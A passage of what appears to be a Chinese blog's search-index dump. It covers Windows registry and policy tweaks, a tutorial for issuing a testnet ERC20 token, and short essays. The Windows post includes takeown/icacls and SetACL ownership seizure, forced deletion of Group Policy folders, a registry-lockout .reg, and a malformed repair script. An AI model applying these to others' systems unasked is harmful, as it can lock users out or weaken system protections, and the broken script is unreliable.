@=\"获取管理员权限\"\"Icon\"=\"C:\\\\Windows\\\\System32\\\\imageres.dll,102\"\"NoWorkingDirectory\"=\"\"[HKEY_CLASSES_ROOT\\Directory\\shell\\runas\\command] @=\"cmd.exe /c takeown /f \\\"%1\\\" /r /d y &amp;&amp; icacls \\\"%1\\\" /grant administrators:F /t\"\"IsolatedCommand\"=\"cmd.exe /c takeown /f \\\"%1\\\" /r /d y &amp;&amp; icacls \\\"%1\\\" /grant administrators:F /t\" 移除权限选项.regWindows Registry Editor Version 5.00[-HKEY_CLASSES_ROOT\\*\\shell\\runas][-HKEY_CLASSES_ROOT\\exefile\\shell\\runas2][-HKEY_CLASSES_ROOT\\Directory\\shell\\runas][-HKEY_CLASSES_ROOT\\*\\shell\\runas-][-HKEY_CLASSES_ROOT\\exefile\\shell\\runas2-][-HKEY_CLASSES_ROOT\\Directory\\shell\\runas-] 获取 TrustedInstaller 超级权限 TrustedInstaller 超级权限是凌驾于管理员权限和系统权限之上的存在 TrustedInstaller 超级权限的添加方法： 下载注册表权限修改工具 SetACL: https://helgeklein.com/download/#download-setacl SetACL 文档： https://helgeklein.com/setacl/ https://helgeklein.com/setacl/documentation/command-line-version-setacl-exe/ 按照如下格式设置执行获取权限命令： SetACL -on 对象名称 -ot 对象类型 -actn 操作 对象名称 (-on)：这是 SetACL 应操作的对象的路径。对象类型（-ot）：对象名称指的是什么类型的对象：文件或目录（file）、注册表项（reg）、服务（srv）、打印机（prn）、网络共享（shr）操作 (-actn)：SetACL 应该如何处理指定的对象 注册表值权限获取就可以用如下命令： SetACL.exe -on \"HKEY_CLASSES_ROOT\\XXX\\{xxxxxxx-666-5555-EEEE-yyyyyy}\" -ot reg -actn setowner -ownr \"n:Administrators\";;注释：将上述注册表项所有者更新到管理员 Administrator（默认为不可更改的 TrustedInstaller ）。SetACL.exe -on \"HKEY_CLASSES_ROOT\\XXX\\{xxxxxxx-666-5555-EEEE-yyyyyy}\" -ot reg -actn ace -ace \"n:Administrators;p:full\";;注释：让上述注册表项所有者 Administrator 获取全部权限。 注意，上述命令缺一不可，而且要按照先后顺序执行。 友情提醒：命令 SetACL -on 对象名称 -ot 对象类型 -actn 操作 适合文件、文件夹（需要写详细路径）和注册表项目超级权限获取，各位可按需提权，出于安全考虑，切勿滥用。如果修改完毕，还可以考虑把命令中的管理员 Administrator 替换为 TrustedInstaller 再次执行命令，恢复系统默认，确保安全。 windows 取消登录界面的名字 1、打开 regedit。 2、定位到以下位置：\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\，找到名为 dontdisplaylastusername 的键值，双击它，然后将它的数值数据改为 1。 3、将鼠标光标放在左侧树状列表的 System 项上，单击右键，选择新建 - DWORD（32 位）值，并将该值命名为：DontDisplayLockedUserID。 4、双击我们刚刚新建的名为 DontDisplayLockedUserID 的 DWORD（32 位）值，你将看到一个编辑 DWORD（32 位）值的窗口。在这个窗口中，将 DontDisplayLockedUserID 的数值数据改为3。 5、修改完成后，关闭注册表编辑器，在开始菜单中点击你的头像，再点击锁定，你将看到锁屏界面。 6、按回车键，或者使用鼠标点击屏幕，你将看到 Win 登录界面。这时我们可以看到，我们的名字已经显示为 “解锁电脑”。 7、要登录 Win，你需要手动输入用户名和密码或者 PIN，需要注意的是，这个用户名以 C:\\Users 中的为准。如果你不清楚你当前的用户名，那么可以打开命令提示符后，里面显示的是 C:\\Users\\XXX &gt;，那么当前的用户名就是 XXX ，在登录 Win 时，将 XXX 填入用户名的输入框即可。 要将 Win10 登陆界面恢复为显示姓名也非常简单，只需再次来到注册表，然后双击名为 dontdisplaylastusername 的键值，将它的数值数据改为 0 即可。 windows 取消登录界面电源按钮1、按下 Win+r 打开运行，输入 regedit 回车，打开注册表编辑器；2、定位至：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System，然后你就会看到 shutdownwithoutlogon 这个 32 位的 DWORD 值；3、双击 shutdownwithoutlogon，打开编辑界面，将数据设置为０；原值为 1.4、操作完成后，你就会发现，登陆界面的电源按钮没了。 上帝模式即 God Mode 完全控制面板 开启方法: 新建文件夹重命名为 GodMode.{ED7BA470-8E54-465E-825C-99712043E01C} 时间显示到秒实验中发现 win11 删除了注册表 ShowSecondsInSystemClock，需要先下载安装 startallback，然后笔者放弃了时间显示到秒。 win11 需要先下载安装 startallback, win10 直接修改注册表 修改注册表 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced 新建 DWORD (32 位) 值 改为 1: \"ShowSecondsInSystemClock\"=dword:00000001 重启 使用注册表隐藏磁盘盘符具体操作如下： 注：在开始之前，请使用 Administrator 帐户登录 Windows10。 1、首先，将鼠标光标放在 “此电脑” 图标上，点击右键，再点击管理。 2、在窗口左侧的树状列表中展开本地用户和组，点击用户文件夹。 3、双击帐户列表中的 Administrator 项，将账户已禁用项取消勾选，然后点击确定按钮。 4、这时，点击开始按钮，再点击你的头像，你可以看到 Administrator 项，只要点击它，我们就可以 以 Administrator 帐户登录 Windows 了。 5、以 Administrator 账户登录 Windows 后，打开 regedit。 6、定位到以下位置：\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ 7、在窗口右侧的空白处点击鼠标右键，选择新建 - 新建 DWORD（32 位）值，并将该值命名为：NoDrives 8、以下是一份对照表，这个表我们接下来有用。 A：1 B：2 C：4 D：8 E：16 F：32 G：64 H：128 I：256 J：512 K：1024 L：2048 M：4096 N：8192 O：16384 P：32768 Q：65536 R：131072 S：262144 T：524288 U：1048576 V：2097152 W：4194304 X：8388608 Y：16777216 Z：33554432 所有：67108863 想要隐藏 E 盘，查表可知，该盘对应的值为 16。 9、双击我们刚刚新建的名为 NoDrives 的 DWOED（32 位）值，将该值基数改为 10 进制，再将该值的数值数据设置为16。 10、重启电脑后，打开文件资源管理器（此电脑），可见，E 盘已经消失了。 11、要进入 E 盘非常简单，我们只需在文件资源管理器的地址栏输入：E:\\，然后回车即可。 如何恢复？ 如果你不想再隐藏 E 盘，那么你可以通过以下方式恢复： 以 Administrator 帐户登录 Windows。打开 regedit，定位到以下位置：\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policie，找到名为 NoDrives 的 DWORD（32 位）值，双击该值，将其数值数据改为 0，然后重启即可。 重置组策略在 Windows 系统中，通过组策略我们可以设置系统的各种软件、计算机和用户策略等。不小心将组策略中的设置修改错了，导致系统中的很多组件都无法使用了，这该怎么办呢？这时候重置组策略编辑器是最好的解决办法 还原本地安全策略用于管理 Windows 安全选项的安全策略与组策略使用了不同的管理控制台 ——secpol.msc（本地安全策略），该安全设置管理单元对组策略进行了扩展，可方便个人用户或域管理员手动配置和定义计算机安全策略。 如果你对 Windows 的安全管理策略不太了解，又自己手动更改了一些乱七八糟的设置，可以通过如下步骤对本地安全策略进行还原： 1、使用 Windows + X 快捷键打开「命令提示符（管理员）」； 2、执行如下命令： secedit /configure /cfg %windir%\\inf\\defltbase.inf /db defltbase.sdb /verbose 3、命令执行完成之后需要重启计算机才能生效，如果某些组件仍出现奇怪的问题，可以通过下面介绍的步骤来重置组策略对象。 使用命令行重置组策略对象此种方法比较特殊，我们可以直接从安装 Windows 的分区中直接删除组策略配置文件夹，以达到全部重置目的： 1、使用 Windows + X 快捷键打开「命令提示符（管理员）」； 2、执行如下命令： RD /S /Q \"%WinDir%\\System32\\GroupPolicyUsers\"RD /S /Q \"%WinDir%\\System32\\GroupPolicy\"gpupdate /force 3、命令执行完成后重启计算机即可。 禁用设置和控制面板该方法适用于：Win10 + 专业版/企业版/教育版 1、运行 gpedit； 2、定位到：用户配置 - 管理模板 - 控制面板，在窗口的右侧找到并双击禁止访问 “控制面板” 和 PC 设置； 3、在弹出的窗口中选择已启用，点击确定按钮； 4、当你完成这些步骤后，用户将无法打开设置。 该方法适用于：Win10 + 家庭版 重要提醒：编辑注册表是有风险的，如果你不小心误操作，这则可能对你电脑的系统造成不可逆转的损害，在继续之前，我们建议你备份注册表或者创建系统还原点。 1、运行 regedit； 2、定位到：\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\，在窗口右侧的空白处单击鼠标右键，选择新建 - DWORD（32 位）值，并将此值命名为：NoControlPanel； 3、双击刚刚新建的名为 NoControlPanel 的 DWORD（32 位）值，将数值数据由 0 改为 1 ，点击确定按钮； 4、完成这些步骤后，用户将无法打开设置。 如何恢复？ 1、如果你是使用组策略编辑器来禁用设置和控制面板的，要恢复原样，你需要进入组策略编辑器，来到以下目录：用户配置 - 管理模板 - 控制面板，在窗口的右侧重新找到禁止访问 “控制面板” 和 PC 设置，双击它，然后在弹出的窗口中将已启用改回未配置，点击确定按钮。 2、如果你是使用注册表编辑器来禁用设置和控制面板的，要恢复原样，你需要进入注册表编辑器，来到以下目录：\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\，在窗口的右侧找到名为 NoControlPanel 的 DWORD（32 位）值，双击它，将数值数据由 1 改成 0 ，点击确定按钮。 禁用注册表没事不要乱动注册表 /邪恶 禁用注册表.regWindows Registry Editor Version 5.00[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]\"DisableRegistryTools\"=dword:00000001 解锁注册表.inf[Version]Signature=“$CHICAGO$”[DefaultInstall]DelReg=del[del]HKCU,Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System,Disableregistrytools,1,00,00,00,00 右键选择安装解锁 修复注册表.cmdreg add \"HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsSelfHostApplicability\" /v \"BranchName\" /d \"fbl_release\" /t REG_SZ /freg add \"HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsSelfHostApplicability\" /v \"ThresholdRiskLevel\" /d \"low\" /t REG_SZ /freg deldte \"HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsSelfHostApplicability\" /v \"ThresholdInternal\" /freg deldte \"HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsSelfHostApplicability\" /v \"ThresholdOptedIn\" /f","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Windows","slug":"操作系统/Windows","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.mhuig.top/tags/Windows/"}]},{"title":"","slug":"wiki/CoPoKo","date":"2022-06-12T04:11:00.000Z","updated":"2022-06-13T08:44:00.000Z","comments":false,"path":"p/wiki-copoko/","permalink":"https://blog.mhuig.top/p/wiki-copoko/","excerpt":"","text":".fa-secondary{opacity:.4} CoPoKo CoPoKo 开始阅读","categories":[{"name":"CoPoKo","slug":"CoPoKo","permalink":"https://blog.mhuig.top/categories/CoPoKo/"}],"tags":[{"name":"CoPoKo","slug":"CoPoKo","permalink":"https://blog.mhuig.top/tags/CoPoKo/"}]},{"title":"部署第一个智能合约","slug":"eth/部署第一个智能合约","date":"2022-03-01T02:12:23.000Z","updated":"2022-03-01T02:12:23.000Z","comments":true,"path":"p/6a03238d/","permalink":"https://blog.mhuig.top/p/6a03238d/","excerpt":"","text":"注意访问本文的引用链接可能需要魔法 对区块链最好的描述是将其描述为一个公共数据库，它由网络中的许多计算机更新和共享。 小试身手我猜您和我们一样会很兴奋在以太坊区块链上部署智能合约并与之交互。 别担心，作为我们的第一个智能合约，我们会将其部署在本地测试网络上，因此您不需要任何开销就可以随意部署和运行它。 编写合约第一步访问 Remix 并创建一个新文件。 在 Remix 界面的左上角添加一个新文件，并输入所需的文件名。 在这个新文件中，我们将粘贴如下代码： // SPDX-License-Identifier: MITpragma solidity &gt;=0.5.17;contract Counter { // Public variable of type unsigned int to keep the number of counts uint256 public count = 0; // Function that increments our counter function increment() public { count += 1; } // Not necessary getter to get the count value function getCount() public view returns (uint256) { return count; }} 如果您曾经写过程序，应该可以轻松猜到这个程序是做什么的。 下面按行解释： 第 3 行：定义了一个名为Counter的合约。 第 6 行：我们的合约存储了一个无符号整型count，从 0 开始。 第 9 行：第一个函数将修改合约的状态并且increment()变量 count。 第 14 行，第二个函数是一个 getter 函数，能够从智能合约外部读取count变量的值。 请注意，因为我们将count变量定义为公共变量，所以这个函数是不必要的，但它可以作为一个例子展示。 第一个简单的智能合约到此结束。 正如您所知，它看上去像是 Java、C++ 这样的面向对象编程语言中的一个类。 现在可以运行我们的合约了。 部署合约当我们写了第一个智能合约后，我们现在可以将它部署在区块链中并运行它。 在区块链上部署智能合约实际上只是发送了一个包含已编译智能合约代码的交易，并且没有指定任何收件人。 我们首先点击左侧的编译图标来编译合约： 然后点击编译按钮： 您可以选择 “自动编译” 选项，这样当您在文本编辑器中保存内容时，合约始终会自动编译。 然后切换到部署和运行交易屏幕： 在 “部署和运行交易” 屏幕上，仔细检查显示的合约名称并点击 “部署”。 在页面顶部可以看到，当前环境为 “Javascript VM”，这意味着当前我们在本地测试区块链上部署智能合约并交互，这样测试可以更快，也不需要任何费用。 点击 “部署” 按钮后，您可以看到合约在底部显示出来。 点击左侧的箭头展开，可以看到合约的内容。 这里有我们的变量counter、函数increment()和 getter getCounter()。 如果您点击count或getCount按钮，它将实际检索合约的count变量的内容，并显示出来。 因为我们尚未调用increment函数，它应该显示 0。 现在点击按钮来调用increment函数。 您可以在窗口底部看到交易产生的日志。 当按下检索数据按钮而非increment按钮时，您看到的日志有所不同。 这是因为读取区块链的数据不需要任何交易（写入）或费用。 因为只有修改区块链的状态需要进行交易。 在按下 increment 按钮后，将产生一个交易来调用我们的increment()函数，如果我们点击 count 或 getCount 按钮，将读取我们的智能合约的最新状态，count 变量大于 0。 使用事件记录智能合约中的数据在 solidity 中，事件是智能合约可触发的调度信号。 去中心化应用或其他任何连接到以太坊 JSON - PRC API 的程序，都可以监听这些事件，并执行相应操作。 可以建立事件的索引，以便稍后可以搜索到事件历史记录。 在撰写这篇文章之时，以太坊区块链上最常见的事件是由 ERC20 代币转账时触发的 Transfer 事件。 event Transfer(address indexed from, address indexed to, uint256 value); 事件签名在合约代码内声明，并且可以使用 emit 关键字来触发。 例如，transfer 事件记录了谁发起了转账 (from)，转账给谁 (to)，以及转账的代币数转账 (value)。 我们再次回到 Counter 智能合约，决定在每次值发生变化时进行记录。 由于这个合约不是为了部署，而是作为基础，通过扩展来构建另一个合约：因此它被称为抽象合约。 在我们 counter 示例中，它将类似于如下： pragma solidity 0.5.17;contract Counter { event ValueChanged(uint oldValue, uint256 newValue); // Private variable of type unsigned int to keep the number of counts uint256 private count = 0; // Function that increments our counter function increment() public { count += 1; emit ValueChanged(count - 1, count); } // Getter to get the count value function getCount() public view returns (uint256) { return count; }} 注意： 第 5 行：我们声明了事件及其包含的内容、旧值以及新值。 第 13 行：当我们增加 count 变量的值时，我们会触发事件。 如果我们现在部署合约并调用 increment 函数，如果您在名为 logs 的数组内单击新交易，我们将看到 Remix 会自动显示它。 日志在调试智能合约时非常有用，另一方面，如果您构建一个不同人使用的应用，并且使分析更容易跟踪和了解您的智能合约的使用情况，那么日志也是非常重要的手段。 交易生成的日志会显示常见的区块浏览器中，并且，举例来说，您也可以使用它们来创建链外脚本，用于侦听特定的事件，并且这些事件发生时采取相应操作。 注册钱包安装 Chrome MetaMask 插件https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn 注册绑定你的账号。 添加 BSC Testnet （测试网络）添加自定义网络 网络名称：BSC Testnet RPC URL: https://data-seed-prebsc-1-s1.binance.org:8545/ 链 ID: 0x61 区块浏览器：https://testnet.bscscan.com/ 货币符号: BNB 每日领取测试 BNB进入 https://testnet.binance.org/faucet-smart , 填入账户 Address 领取测试链的 BNB。 BNB 用于支付测试网络的燃料费用. 在 metamask 钱包中也可以看到这笔 BNB 到账了。 发行 MHGC (MHuiGCoin) 代币进入 Remix 环境 中 FILE EXPLORERS依次创建三个文件: EIP20.sol、EIP20Factory.sol、EIP20Interface.sol。 EIP20.sol/*Implements EIP20 token standard: https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md.*/pragma solidity ^0.4.21;import \"./EIP20Interface.sol\";contract EIP20 is EIP20Interface { uint256 constant private MAX_UINT256 = 2**256 - 1; mapping (address =&gt; uint256) public balances; mapping (address =&gt; mapping (address =&gt; uint256)) public allowed; /* NOTE: The following variables are OPTIONAL vanities. One does not have to include them. They allow one to customise the token contract &amp; in no way influences the core functionality. Some wallets/interfaces might not even bother to look at this information. */ string public name; //fancy name: eg Simon Bucks uint8 public decimals; //How many decimals to show. string public symbol; //An identifier: eg SBX function EIP20( uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol ) public { balances[msg.sender] = _initialAmount; // Give the creator all initial tokens totalSupply = _initialAmount; // Update total supply name = _tokenName; // Set the name for display purposes decimals = _decimalUnits; // Amount of decimals for display purposes symbol = _tokenSymbol; // Set the symbol for display purposes } function transfer(address _to, uint256 _value) public returns (bool success) { require(balances[msg.sender] &gt;= _value); balances[msg.sender] -= _value; balances[_to] += _value; emit Transfer(msg.sender, _to, _value); //solhint-disable-line indent, no-unused-vars return true; } function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) { uint256 allowance = allowed[_from][msg.sender]; require(balances[_from] &gt;= _value &amp;&amp; allowance &gt;= _value); balances[_to] += _value; balances[_from] -= _value; if (allowance &lt; MAX_UINT256) { allowed[_from][msg.sender] -= _value; } emit Transfer(_from, _to, _value); //solhint-disable-line indent, no-unused-vars return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) public returns (bool success) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); //solhint-disable-line indent, no-unused-vars return true; } function allowance(address _owner, address _spender) public view returns (uint256 remaining) { return allowed[_owner][_spender]; }} EIP20Factory.solimport \"./EIP20.sol\";pragma solidity ^0.4.21;contract EIP20Factory { mapping(address =&gt; address[]) public created; mapping(address =&gt; bool) public isEIP20; //verify without having to do a bytecode check. bytes public EIP20ByteCode; // solhint-disable-line var-name-mixedcase function EIP20Factory() public { //upon creation of the factory, deploy a EIP20 (parameters are meaningless) and store the bytecode provably. address verifiedToken = createEIP20(10000, \"Verify Token\", 3, \"VTX\"); EIP20ByteCode = codeAt(verifiedToken); } //verifies if a contract that has been deployed is a Human Standard Token. //NOTE: This is a very expensive function, and should only be used in an eth_call. ~800k gas function verifyEIP20(address _tokenContract) public view returns (bool) { bytes memory fetchedTokenByteCode = codeAt(_tokenContract); if (fetchedTokenByteCode.length != EIP20ByteCode.length) { return false; //clear mismatch } //starting iterating through it if lengths match for (uint i = 0; i &lt; fetchedTokenByteCode.length; i++) { if (fetchedTokenByteCode[i] != EIP20ByteCode[i]) { return false; } } return true; } function createEIP20(uint256 _initialAmount, string _name, uint8 _decimals, string _symbol) public returns (address) { EIP20 newToken = (new EIP20(_initialAmount, _name, _decimals, _symbol)); created[msg.sender].push(address(newToken)); isEIP20[address(newToken)] = true; //the factory will own the created tokens. You must transfer them. newToken.transfer(msg.sender, _initialAmount); return address(newToken); } //for now, keeping this internal. Ideally there should also be a live version of this that // any contract can use, lib-style. //retrieves the bytecode at a specific address. function codeAt(address _addr) internal view returns (bytes outputCode) { assembly { // solhint-disable-line no-inline-assembly // retrieve the size of the code, this needs assembly let size := extcodesize(_addr) // allocate output byte array - this could also be done without assembly // by using outputCode = new bytes(size) outputCode := mload(0x40) // new \"memory end\" including padding mstore(0x40, add(outputCode, and(add(add(size, 0x20), 0x1f), not(0x1f)))) // store length in memory mstore(outputCode, size) // actually retrieve the code, this needs assembly extcodecopy(_addr, add(outputCode, 0x20), 0, size) } }} EIP20Interface.sol// Abstract contract for the full ERC 20 Token standard// https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.mdpragma solidity ^0.4.21;contract EIP20Interface { /* This is a slight change to the ERC20 base standard. function totalSupply() constant returns (uint256 supply); is replaced with: uint256 public totalSupply; This automatically creates a getter function for the totalSupply. This is moved to the base contract since public getter functions are not currently recognised as an implementation of the matching abstract function by the compiler. */ /// total amount of tokens uint256 public totalSupply; /// @param _owner The address from which the balance will be retrieved /// @return The balance function balanceOf(address _owner) public view returns (uint256 balance); /// @notice send `_value` token to `_to` from `msg.sender` /// @param _to The address of the recipient /// @param _value The amount of token to be transferred /// @return Whether the transfer was successful or not function transfer(address _to, uint256 _value) public returns (bool success); /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from` /// @param _from The address of the sender /// @param _to The address of the recipient /// @param _value The amount of token to be transferred /// @return Whether the transfer was successful or not function transferFrom(address _from, address _to, uint256 _value) public returns (bool success); /// @notice `msg.sender` approves `_spender` to spend `_value` tokens /// @param _spender The address of the account able to transfer the tokens /// @param _value The amount of tokens to be approved for transfer /// @return Whether the approval was successful or not function approve(address _spender, uint256 _value) public returns (bool success); /// @param _owner The address of the account owning tokens /// @param _spender The address of the account able to transfer the tokens /// @return Amount of remaining tokens allowed to spent function allowance(address _owner, address _spender) public view returns (uint256 remaining); // solhint-disable-next-line no-simple-event-func-name event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value);} SOLIDITY COMPILER我们选择 0.4.21 版本的编译环境. 点击编译. 在这里你可以将源码发布到IPFS. Metadata of \"eip20\" was published successfully.token/EIP20.sol : dweb:/ipfs/QmZemboWkhVyhYMRyCJmjwhw4caenvXS5Mw7Uc5tdE77jPtoken/EIP20Interface.sol : dweb:/ipfs/QmWQEUAdy5QnnCTGsEtRfedZrVG2xZ77YfKiPE5MVvQiSSmetadata.json : dweb:/ipfs/QmWFrJHPJLEWJGAoXpq8MD1pGJsvdcfxhPiW5SDXiwEvm8 DEPLOY &amp; RUN TRANSACTIONS运行环境选择 Injected Web3 因为我们用的是 metamask 钱包；Account 账户填写 metamask 钱包账户；此时浏览器插件会弹出, 我们选择连接账户. 点击下一步, 点击连接. 在 DEPLOY 中输入部署信息, 合约构造函数的输入参数. _INITIALAMOUNT: \"21000000000000000000000000\"_TOKENNAME: \"MHuiGCoin\"_DECIMALUNITS: \"18\"_TOKENSYMBOL: \"MHGC\" 发币数量21000000, 和比特币一样，向中本聪致敬。 货币名称MHuiGCoin，最小货币单位18（decimaUnits），货币简称MHGC。 点击transact. 点击确认支付燃料费用. 从 Deployed Contracts 复制部署的合约地址: 0xeb86A66E2d4A51F8de3d4d0F509f18A15Cde68F6. 导入代币合约进入部署合约的 MetaMask 账户, 点击导入代币. 输入代币合约信息 代币合约地址：0xeb86A66E2d4A51F8de3d4d0F509f18A15Cde68F6 代币符号：MHGC 小数精度：18 可以看到我的账户中有 21000000 MHGC (MHuiGCoin) 代币转账测试我们创建一个新的账户, 并导入上面的代币合约. 我们向目标账户发送 1 MHGC 测试 需要支付测试网络的燃料费用. 转账发送成功. 测试网络资源管理器在资源管理器中查看 资产: https://testnet.bscscan.com/token/0xeb86A66E2d4A51F8de3d4d0F509f18A15Cde68F6 可以看到资源信息和公开的转账记录. 如你所见这些在区块链中已经发生的历史信息是无法更改的. 安全风险提示任何人都可以创建代币，包括创建现有代币的假版本。了解更多关于 欺诈和安全风险. 2016 年 6 月，The DAOEther 的漏洞造成损失 5000 万美元，而开发者试图达成共识的解决方案。DAO 的程序在黑客删除资金之前有一段时间的延迟。以太坊软件的一个硬分叉在时限到期之前完成了攻击者的资金回收工作。 2021 年 9 月 24 日，中国人民银行发布进一步防范和处置虚拟货币交易炒作风险的通知。通知指出，虚拟货币不具有与法定货币等同的法律地位。比特币、以太币、泰达币等虚拟货币具有非货币当局发行、使用加密技术及分布式账户或类似技术、以数字化形式存在等主要特点，不具有法偿性，不应且不能作为货币在市场上流通使用 。 最后MHGC 获取方式测试网络 网络名称：BSC Testnet RPC URL: https://data-seed-prebsc-1-s1.binance.org:8545/ 链 ID: 0x61 区块浏览器：https://testnet.bscscan.com/ 货币符号: BNB 代币合约 代币合约地址：0xeb86A66E2d4A51F8de3d4d0F509f18A15Cde68F6 代币符号：MHGC 小数精度：18 尾巴联系我, 发我地址，在 BSC Testnet 下可领取 100 MHGC. 共发行 21000000 MHGC, 集齐 22000000 MHGC可领取精美礼品一份. Just For Fun. 参考资料 Welcome to Ethereum This message is used to verify that this feed (feedId:83048545374666752) belongs to me (userId:82913974185265152). Join me in enjoying the next generation information browser https://follow.is.","categories":[{"name":"以太坊","slug":"以太坊","permalink":"https://blog.mhuig.top/categories/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"},{"name":"智能合约","slug":"以太坊/智能合约","permalink":"https://blog.mhuig.top/categories/%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"}],"tags":[{"name":"以太坊","slug":"以太坊","permalink":"https://blog.mhuig.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"},{"name":"智能合约","slug":"智能合约","permalink":"https://blog.mhuig.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"区块链","slug":"区块链","permalink":"https://blog.mhuig.top/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"}]},{"title":"一组粗略的类比","slug":"pen/一组粗略的类比","date":"2021-10-02T03:00:00.000Z","updated":"2021-10-02T03:00:00.000Z","comments":true,"path":"p/6dc844b7/","permalink":"https://blog.mhuig.top/p/6dc844b7/","excerpt":"","text":"这是一个关于生物学与深度学习的粗略类比的笔记, 这些类比中的大多数都是非常推测性和探索性的，但我发现它们很有趣并且值得思考. 生物学 深度学习 外界环境 输入数据 认知过程 特征提取 基因 神经网络权重结构 (特征) 基因突变 神经网络权重结构改变 性状 神经网络功能 细胞 神经元 组织 (细胞分化) 神经网络在后面的层 器官 神经网络专门处理特定任务的组件 个体 模型 繁殖 迭代 反馈调节 优化器 (eg: 梯度下降) 更新网络的机制 自然选择 损失函数定向衡量性能 进化 学习 进化 = 基因突变 + 自然选择 (定向) 学习 = 神经网络权重结构改变 + 损失函数定向衡量性能 基因决定性状 神经网络权重结构可以决定神经网络功能 个体繁殖 模型迭代","categories":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"唯物辩证法","slug":"philosophy/唯物辩证法","date":"2021-09-15T07:13:40.000Z","updated":"2021-09-15T07:13:40.000Z","comments":true,"path":"p/6ace289f/","permalink":"https://blog.mhuig.top/p/6ace289f/","excerpt":"唯物辩证法是关于自然界、人类社会以及人类思维领域发展最一般规律的科学，它在坚持唯物论观点的基础上，研究世界的运行状况、形态和发展规律，进一步回答客观世界究竟 “怎么样” 的问题。","text":"唯物辩证法是关于自然界、人类社会以及人类思维领域发展最一般规律的科学，它在坚持唯物论观点的基础上，研究世界的运行状况、形态和发展规律，进一步回答客观世界究竟 “怎么样” 的问题。 唯物辩证法的总特征唯物辩证法的基本观点是：世界是普遍联系的有机整体，同时又是变化发展的。联系和发展的观点是唯物辩证法的总特征。 事物的普遍联系联系指事物内部各要素之间和事物之间相互影响、相互制约、相互作用的关系。 联系的特性及其具体内容如下表所示： 特性 具体内容 客观性 事物的联系是事物本身所固有的，不是主观臆想的 普遍性 任何事物内部的不同部分和要素之间都是相互联系的；任何事物都不能孤立存在，都同其他事物处于一定的联系之中，整个世界是相互联系的统一整体。 多样性 世界上的事物是多样的，事物之间的联系也是多样的 条件性 条件是对事物存在和发展发生作用的诸要素的总和。条件对事物发展和人的活动具有支持或制约作用；条件是可以改变的；改变和创造条件不是任意的，必须尊重事物发展的客观规律。 事物的变化发展事物的相互联系包含事物的相互作用，而相互作用必然导致事物的运动、变化和发展。 发展是前进的、上升的运动，发展的实质是新事物的产生和旧事物的灭亡。 联系与发展的基本环节内容与形式、本质与现象、原因与结果、必然与偶然、现实与可能构成了联系和发展的基本环节。 唯物辩证法的三大规律对立统一规律唯物辩证法的实质和核心对立统一规律是唯物辩证法的实质和核心，其原因如下： 对立统一规律揭示了事物普遍联系的根本内容和变化发展的内在动力，从根本上回答了事物为什么会发展的问题。 对立统一规律是贯穿量变质变规律、否定之否定规律以及唯物辩证法基本范畴的中心线索，也是理解这些规律和范畴的 “钥匙”。 对立统一规律为人们提供了认识世界和改变造世界的根本方法 —— 矛盾分析析方法。 对立统一规律又称矛盾规律，矛盾是辩证法的核心概念，是否承认矛盾，是否承认矛盾是事物发展的动力和源泉，是辩证法和形而上学的根本分歧。 矛盾的两种基本属性是同一性和斗争性，矛盾的同一性和斗争性相互联结，相辅相成。 内因和外因内因指事物发展变化的内部原因，是事物自身的矛盾。 外因指事物之间的相互联系、相互影响，是事物变化的条件。 二者的关系：内因是事物变化的依据，外因是事物变化的条件，外因必须通过内因起作用，内因与外因共同推动事物的发展。 矛盾的普遍性和特殊性矛盾的普遍性指矛盾存在于一切事物中，存在于一切事物发展过程的始终，即” 矛盾无处不在，矛盾无时不有”。 矛盾的特殊性指各个具体事物的矛盾、每一个矛盾的各个方面在发展的不同阶段上各有其特点。矛盾的特殊性决定了事物的不同性质。 